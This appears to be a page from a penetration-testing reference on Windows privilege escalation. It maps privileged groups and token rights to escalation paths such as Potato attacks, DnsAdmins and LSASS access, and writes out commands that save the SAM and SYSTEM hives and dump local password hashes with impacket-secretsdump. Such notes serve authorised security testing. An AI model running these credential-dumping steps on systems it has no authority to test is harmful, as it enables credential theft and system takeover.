# Privileged groups and token rights

[← Windows quick reference](../04-windows-privesc.md)

Read the current token, not just the account's group list. A named privilege may need to be enabled by the selected method before it can be used.

```powershell
whoami /all
whoami /groups
whoami /priv
net localgroup
```

| Finding | Follow-up |
| --- | --- |
| `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` | Check a matching [Potato path](potato.md). |
| Backup Operators / `SeBackupPrivilege` | Check whether SAM and SYSTEM can be saved for offline analysis. |
| DnsAdmins | Check control of the DNS server plug-in setting and service restart. |
| Server Operators | Check service configuration and restart rights. |
| `SeDebugPrivilege` | Check whether the process can inspect LSASS or another privileged process. |

For a confirmed local backup path:

```powershell
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Save original service or file state before any change and restore it afterward.
